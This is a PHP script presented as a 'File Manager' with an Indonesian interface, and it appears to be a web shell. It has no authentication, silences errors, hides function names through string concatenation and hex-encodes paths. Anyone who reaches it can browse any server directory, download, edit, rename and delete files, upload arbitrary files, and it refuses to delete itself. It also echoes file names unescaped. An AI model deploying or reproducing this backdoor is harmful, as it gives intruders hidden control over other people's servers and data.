<?php
error_reporting(0);

function uhx($sky) {
	$str = '';
	for ($i = 0; $i < strlen($sky) - 1; $i += 2) {
		$str .= chr(hexdec($sky[$i] . $sky[$i + 1]));
	}
	return $str;
}

function hx($sky) {
	$str = '';
	for ($i = 0; $i < strlen($sky); $i++) {
		$str .= dechex(ord($sky[$i]));
	}
	return $str;
}

function g_ico($filename) {
	$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
	$icon_map = [
		'jpg' => 'fa-file-image text-danger', 'jpeg' => 'fa-file-image text-danger', 'png' => 'fa-file-image text-danger',
		'pdf' => 'fa-file-pdf text-danger', 'zip' => 'fa-file-archive text-info', 'rar' => 'fa-file-archive text-info',
		'php' => 'fa-file-code text-primary', 'html' => 'fa-file-code text-warning', 'css' => 'fa-file-code text-info',
		'js' => 'fa-file-code text-warning', 'txt' => 'fa-file-alt text-secondary'
	];
	$icon = isset($icon_map[$ext]) ? $icon_map[$ext] : 'fa-file text-secondary';
	return '<i class="fa-solid ' . $icon . ' fa-lg"></i>';
}

function del_c($dir) {
	if (!file_exists($dir)) return true;
	if (!is_dir($dir)) return unlink($dir);
	foreach (scandir($dir) as $item) {
		if ($item == '.' || $item == '..') continue;
		if (!del_c($dir . '/' . $item)) return false;
	}
	return rmdir($dir);
}

$r = 'r'.'e'.'a'.'l'.'p'.'a'.'t'.'h';
$b = 'b'.'a'.'s'.'e'.'n'.'a'.'m'.'e';
$h = 'h'.'e'.'a'.'d'.'e'.'r';

$self = $b($_SERVER['PHP_SELF']);
$current_dir = isset($_GET['x']) ? uhx($_GET['x']) : __DIR__;
if ($r($current_dir)) {
	$current_dir = str_replace('\\', '/', $r($current_dir));
}
$parent_dir = dirname($current_dir);

if (isset($_GET['dn'])) {
	$file = $current_dir . '/' . uhx($_GET['dn']);
	if (file_exists($file) && is_file($file)) {
		$h('Content-Description: File Transfer');
		$h('Content-Type: application/octet-stream');
		$h('Content-Disposition: attachment; filename="' . $b($file) . '"');
		$h('Expires: 0');
		$h('Cache-Control: must-revalidate');
		$h('Pragma: public');
		$h('Content-Length: ' . filesize($file));
		readfile($file);
		exit;
	}
}

if (isset($_POST['mul_d']) && !empty($_POST['s_item'])) {
	$success_count = 0;
	$fail_count = 0;
	foreach ($_POST['s_item'] as $item) {
		$item = $b($item); 
		$target = $current_dir . '/' . $item;
		if ($item !== $self && file_exists($target)) {
			if (del_c($target)) {
				$success_count++;
			} else {
				$fail_count++;
			}
		}
	}
	if ($fail_count === 0 && $success_count > 0) {
		$message = "Berhasil menghapus $success_count item.";
		$alert_type = "success";
	} elseif ($success_count > 0 && $fail_count > 0) {
		$message = "Berhasil hapus $success_count item, namun $fail_count item gagal dihapus.";
		$alert_type = "warning";
	} elseif ($success_count === 0 && $fail_count > 0) {
		$message = "Gagal menghapus semua item yang dipilih. Periksa izin akses (permission).";
		$alert_type = "error";
	} else {
		$message = "Tidak ada item yang dihapus.";
		$alert_type = "info";
	}
}

if (isset($_GET['d'])) {
	$del_param = uhx($_GET['d']);
	$target = $current_dir . '/' . $del_param;
	if ($del_param !== $self) {
		if (file_exists($target)) {
			if (del_c($target)) {
				$message = "File <b>" . $b($target) . "</b> berhasil dihapus!";
				$alert_type = "success";
			} else {
				$message = "Gagal menghapus <b>" . $b($target) . "</b> Periksa izin akses.";
				$alert_type = "error";
			}
		} else {
			$message = "<b>" . $b($target) . "</b> tidak ditemukan.";
			$alert_type = "warning";
		}
	} else {
		$message = "Anda tidak dapat menghapus file sistem ini sendiri!";
		$alert_type = "warning";
	}
}

if (isset($_POST['sv_cnt'])) {
	$file = $current_dir . '/' . $_POST['t_fi'];
	if (file_exists($file)) {
		$result = file_put_contents($file, $_POST['edit_content']);
		if ($result !== false) {
			$message = "File <b>" . $b($file) . "</b> berhasil disimpan!";
			$alert_type = "success";
		} else {
			$message = "Gagal menyimpan <b>" . $b($file) . "</b>!";
			$alert_type = "error";
		}
	}
}

if (isset($_POST['new_name']) && isset($_POST['old_name'])) {
	$old_path = $current_dir . '/' . $_POST['old_name'];
	$new_path = $current_dir . '/' . $_POST['new_name'];
	if (file_exists($new_path)) {
		$message = "Gagal: <b>" . $b($new_path) . "</b> sudah ada!";
		$alert_type = "warning";
	} else {
		if (@rename($old_path, $new_path)) {
			$message = "<b>" . $b($old_path) . "</b> berhasil diubah ke <b>" . $b($new_path) . "</b>";
			$alert_type = "success";
		} else {
			$message = "Gagal mengubah nama. Periksa izin akses.";
			$alert_type = "error";
		}
	}
}

if (isset($_FILES['upl'])) {
	$file_name = $b($_FILES['upl']['name']);
	$target = $current_dir . '/' . $file_name;
	if ($_FILES['upl']['error'] === UPLOAD_ERR_OK) {
		if (move_uploaded_file($_FILES['upl']['tmp_name'], $target)) {
			$message = "File '$file_name' berhasil diunggah!";
			$alert_type = "success";
		} else {
			$message = "Gagal memindahkan file ke direktori tujuan.";
			$alert_type = "error";
		}
	} else {
		$message = "Terjadi kesalahan sistem saat upload (Error Code: " . $_FILES['upl']['error'] . ")";
		$alert_type = "error";
	}
}

$scan = @scandir($current_dir);
$folders = []; $files = [];
$is_accessible = ($scan !== false);
if ($is_accessible) {
	$scan = array_diff($scan, array('.', '..'));
	foreach ($scan as $item) {
		is_dir($current_dir . '/' . $item) ? $folders[] = $item : $files[] = $item;
	}
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>File Manager</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
	<style>
		body { background: #f4f7f6; font-family: 'Segoe UI', sans-serif; font-size: 13px; }
		.main-card { background: white; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); margin-top: 20px; padding: 20px; }
		.badge-type { font-family: 'Consolas', monospace; text-transform: none; font-size: 10px; }
		.btn-icon { width: 32px; height: 32px; padding: 0; line-height: 32px; text-align: center; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; transition: 0.2s; }
		.btn-icon:hover { transform: scale(1.1); }
		.table tr:hover { background-color: #fcfcfc; }
	</style>
</head>
<body>
<div class="container-fluid px-md-5">
	<div class="main-card">
		<div class="d-flex justify-content-between align-items-center mb-3">
			<h5 class="m-0"><i class="fa-solid fa-hard-drive text-primary me-2"></i> File Manager</h5>
			<div class="d-flex gap-2">
				<button type="button" class="btn btn-primary btn-sm" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="fa-solid fa-upload"></i> Upload</button>
				<a href="?x=<?= hx($parent_dir) ?>" class="btn btn-secondary btn-sm"><i class="fa-solid fa-level-up-alt"></i></a>
			</div>
		</div>

		<div class="p-2 bg-light rounded mb-3 border-start border-4 border-primary">
			<code class="text-dark small"><?= $current_dir ?></code>
		</div>
			<?php
			if (isset($_GET['e'])): 
				$edit_file = uhx($_GET['e']);
				$edit_path = $current_dir . '/' . $edit_file;
				if (!file_exists($edit_path) || is_dir($edit_path)) {
					$message = "File <b>" . htmlspecialchars($edit_file) . "</b> tidak ditemukan!";
					$alert_type = "error";

				}
			?>
			<div class="card card-body mb-4 border-primary shadow-sm">
				<div class="d-flex justify-content-between mb-2">
					<h6 class="m-0"><i class="fa-solid fa-file text-primary"></i>: <b><?= uhx($_GET['e']) ?></b></h6>
					<a href="?x=<?= hx($current_dir) ?>" class="btn-close"></a>
				</div>
				<form method="POST">
					<input type="hidden" name="t_fi" value="<?= uhx($_GET['e']) ?>">
					<textarea name="edit_content" class="form-control mb-3" rows="10" style="font-family:Consolas; font-size:12px;"><?= htmlspecialchars(file_get_contents($edit_path)); ?></textarea>
					<button type="submit" name="sv_cnt" class="btn btn-success btn-sm px-4">Simpan</button>
				</form>
			</div>
		<?php endif; ?>
		<form action="?x=<?= hx($current_dir) ?>" method="POST" id="mainForm">
			<input type="hidden" name="mul_d" value="1">
			<div class="table-responsive">
				<table class="table table-hover align-middle border">
					<thead class="table-light">
						<tr>
							<th width="40"><input type="checkbox" id="checkAll" class="form-check-input"></th>
							<th>Nama</th>
							<th width="180">Technical Type</th>
							<th width="100">Perms</th>
							<th width="180" class="text-center">Aksi</th>
						</tr>
					</thead>
					<tbody>
						<?php if (!$is_accessible): ?>
							<tr><td colspan="5" class="text-center py-5 text-danger"><i class="fa-solid fa-lock fa-2x mb-2"></i><br>Permission Denied</td></tr>
						<?php elseif (empty($folders) && empty($files)): ?>
							<tr><td colspan="5" class="text-center py-5 text-muted"><i class="fa-solid fa-ghost fa-2x mb-2 opacity-25"></i><br>None</td></tr>
						<?php else: ?>
							<?php foreach ($folders as $f): $full = $current_dir . '/' . $f; ?>
							<tr>
								<td><input type="checkbox" name="s_item[]" value="<?= $f ?>" class="form-check-input item-checkbox"></td>
								<td><i class="fa-solid fa-folder text-warning me-2"></i><b><a href="?x=<?= hx($full) ?>" class="text-dark text-decoration-none"><?= $f ?></a></b></td>
								<td><span class="badge bg-warning text-dark badge-type">directory</span></td>
								<td class="text-<?= is_writable($full) ? 'success' : 'danger' ?> fw-bold"><?= substr(sprintf('%o', fileperms($full)), -3); ?></td>
								<td class="text-center">
									<button type="button" onclick="renameItem('<?= $f ?>')" class="btn btn-outline-dark btn-icon" title="Rename"><i class="fa-solid fa-pencil"></i></button>
									<a href="?x=<?= hx($current_dir) ?>&d=<?= hx($f) ?>" class="btn btn-outline-danger btn-icon" title="Delete"><i class="fa-solid fa-trash-can"></i></a>
								</td>
							</tr>
							<?php endforeach; ?>
							<?php foreach ($files as $f): 
								$full = $current_dir . '/' . $f;
								$mime = (function_exists('mime_content_type')) ? @mime_content_type($full) : 'application/octet-stream';
							?>
							<tr>
								<td><input type="checkbox" name="s_item[]" value="<?= $f ?>" class="form-check-input item-checkbox"></td>
								<td><span class="me-2"><?= g_ico($f) ?></span><?= $f ?></td>
								<td><span class="badge bg-light text-dark border badge-type"><?= $mime ?></span></td>
								<td class="text-<?= is_writable($full) ? 'success' : 'danger' ?> fw-bold"><?= substr(sprintf('%o', fileperms($full)), -3); ?></td>
								<td class="text-center">
									<div class="d-flex justify-content-center gap-1">
										<a href="?x=<?= hx($current_dir) ?>&e=<?= hx($f) ?>" class="btn btn-outline-primary btn-icon" title="Edit"><i class="fa-solid fa-code"></i></a>
										<button type="button" onclick="renameItem('<?= $f ?>')" class="btn btn-outline-dark btn-icon" title="Rename"><i class="fa-solid fa-pencil"></i></button>
										<a href="?x=<?= hx($current_dir) ?>&dn=<?= hx($f) ?>" class="btn btn-outline-success btn-icon" title="Download"><i class="fa-solid fa-download"></i></a>
										<a href="?x=<?= hx($current_dir) ?>&d=<?= hx($f) ?>" class="btn btn-outline-danger btn-icon" title="Delete"><i class="fa-solid fa-trash-can"></i></a>
									</div>
								</td>
							</tr>
							<?php endforeach; ?>
						<?php endif; ?>
					</tbody>
				</table>
			</div>
			<?php if (!empty($folders) || !empty($files)): ?>
				<button type="button" onclick="confirmMultiDelete()" class="btn btn-danger btn-sm mt-2"><i class="fa-solid fa-trash-can"></i>Hapus</button>
			<?php endif; ?>
		</form>
	</div>
</div>
<div class="modal fade" id="uploadModal" tabindex="-1">
	<div class="modal-dialog modal-dialog-centered"><form method="POST" enctype="multipart/form-data" class="modal-content"><div class="modal-header"><h6>Upload File</h6><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><input type="file" name="upl" class="form-control" required></div><div class="modal-footer"><button type="submit" class="btn btn-primary w-100">Upload Sekarang</button></div></form></div>
</div>
<script>
	document.getElementById('checkAll').onclick = function() {
		var checkboxes = document.getElementsByClassName('item-checkbox');
		for (var checkbox of checkboxes) { checkbox.checked = this.checked; }
	}
	function confirmMultiDelete() {
		var count = document.querySelectorAll('.item-checkbox:checked').length;
		if (count === 0) return Swal.fire('Pilih item dulu!', '', 'info');
		Swal.fire({ title: 'Hapus ' + count + ' item?', icon: 'warning', showCancelButton: true, confirmButtonText: 'Ya, Hapus' }).then((r) => { if (r.isConfirmed) document.getElementById('mainForm').submit(); });
	}
	function renameItem(old) {
		Swal.fire({ title: 'Ganti nama', input: 'text', inputValue: old, showCancelButton: true }).then((r) => {
			if (r.value && r.value !== old) {
				const f = document.createElement('form'); f.method = 'POST';
				f.innerHTML = `<input type="hidden" name="old_name" value="${old}"><input type="hidden" name="new_name" value="${r.value}">`;
				document.body.appendChild(f); f.submit();
			}
		});
	}
	<?php if ($message): ?>Swal.fire({icon: '<?= $alert_type ?>',title: '<?= $message ?>',timer: 3500 });
<?php endif; ?>
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>